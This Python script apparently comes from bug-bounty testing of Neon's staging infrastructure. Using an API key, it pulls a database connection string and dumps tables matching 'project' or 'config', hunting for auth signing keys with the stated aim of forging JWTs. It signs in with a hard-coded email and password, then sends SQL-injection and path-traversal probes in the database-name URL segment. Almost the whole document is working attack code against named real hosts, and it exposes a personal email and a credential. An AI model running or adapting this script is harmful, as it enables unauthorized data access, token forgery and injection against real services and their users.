# -*- coding: utf-8 -*-
"""probe: locate project_config table (schema/structure/content) in neondb
- if it holds auth signing keys -> forge Data API JWT chain
- also: db-name SQL char injection probes on /postgres/ prefix"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"


def na(host, method, path, body=None, cookie=None, origin="http://localhost:3000",
       timeout=25):
    conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def main():
    # DB direct: locate project_config
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("SELECT table_schema, table_name FROM information_schema.tables "
                        "WHERE table_name LIKE '%project%' OR table_name LIKE '%config%'")
            print("tables:", cur.fetchall())
            cur.execute("SELECT table_schema, table_name FROM information_schema.tables "
                        "WHERE table_schema='neon_auth'")
            print("neon_auth tables:", cur.fetchall())
            # find project_config anywhere
            for sch, tbl in cur.fetchall() or []:
                if "project" in tbl.lower() or "config" in tbl.lower():
                    pass
    # try to locate + dump project_config content (owner read)
    with psycopg.connect(uri2, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            cur.execute("SELECT schemaname, tablename FROM pg_tables "
                        "WHERE tablename ILIKE '%project%' OR tablename ILIKE '%config%'")
            rows = cur.fetchall()
            print("pg_tables match:", rows)
            for sch, tbl in rows:
                try:
                    cur.execute('SELECT count(*) FROM "%s"."%s"' % (sch, tbl))
                    n = cur.fetchone()[0]
                    print("== %s.%s (%d rows) ==" % (sch, tbl, n))
                    if n > 0 and n < 50:
                        cur.execute('SELECT * FROM "%s"."%s" LIMIT 20' % (sch, tbl))
                        cols = [d[0] for d in cur.description]
                        print("cols:", cols)
                        for row in cur.fetchall():
                            print(str(row)[:400])
                except Exception as e:
                    print("err on %s.%s: %s" % (sch, tbl, str(e)[:100]))
    # db-name SQL-char probes on na host /postgres/ prefix
    st, d, ck = na(NA_HOST, "POST", "/neondb/auth/sign-in/email",
                   {"email": "libobo1229+na_org1@gmail.com", "password": PASS})
    c1 = ck.split(";")[0]
    print("\n-- dbname sql-char probes --")
    for pre in ("postgres'", 'postgres"', "postgres;", "postgres--", "postgres%27",
                "postgres/../postgres", "postgres%00", "postgres\\", "postgres`",
                "pg_catalog", "information_schema", "template0", "template1"):
        st, d, _ = na(NA_HOST, "GET", "/%s/auth/organization/list" % pre, cookie=c1)
        print("%-22s -> %s %s" % (pre, st, d[:100]))


if __name__ == "__main__":
    main()
